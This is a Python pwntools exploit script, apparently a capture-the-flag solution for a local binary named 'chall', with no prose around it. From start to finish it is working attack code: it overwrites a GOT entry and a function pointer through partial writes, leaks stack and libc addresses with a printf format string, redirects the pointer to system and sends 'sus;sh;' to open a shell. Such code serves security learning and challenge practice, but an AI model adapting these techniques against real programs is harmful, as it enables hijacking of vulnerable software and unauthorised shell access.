#!/bin/env python3

from pwn import *
import time
from sys import argv

context.binary = elf = ELF('./chall')
context.terminal = ['tmux', 'splitw', '-h']

p = process("./chall")

# s = '''
# b *0x004017a7
# c
# '''
# if argv[1] == 'd':
#     p = gdb.debug("./chall", s)

# offset for start of the custom struct
struct_offset = 0x23c0

payload  = b"a" * struct_offset
payload += p64(elf.got['exit'])[:3]

p.clean()
p.sendline(payload)

# 0x000000000040101a : ret
p.sendline(p64(0x000000000040101a)[:3])

READ = 0x0040197f

payload  = b"X" * (0x18)
payload += p64(READ)[:3]

p.sendline(payload)

payload  = b"b" * 0x2308 # offset to write into
# [0x4040c8] the ptr to the function that will be called for
payload += p64( 0x4040c8 )[:3]

p.sendline(payload)

log.success(f"printf @ {hex(elf.sym.printf)}")
p.sendline(p64(elf.sym.printf)[:3])

# use printf to leak
p.sendline(b"sus_%14$p_%19$p_")

leak = p.recvline()
stack_baseaddr = int(leak.split(b"_")[1].decode(), 16) - 0x1ee40
libc_baseaddr = int(leak.split(b"_")[2].decode(), 16) - (0x1d90+163840)

# libc.address = 0x1d90

log.success(f"stack addr @ {hex(stack_baseaddr)}")
log.success(f"libc addr  @ {hex(libc_baseaddr)}")

p.sendline(b"not")

system = libc_baseaddr + 0x50d70 # addr to system

payload  = b"A" * (0x2308 - (8*20)) # offset to write into
# [0x4040c8] the ptr to the function that will be called for
payload += p64( 0x4040c8 )[:3]

p.sendline(payload)

p.sendline(p64(system)[:6])

p.sendline(b"sus;sh;")

p.interactive()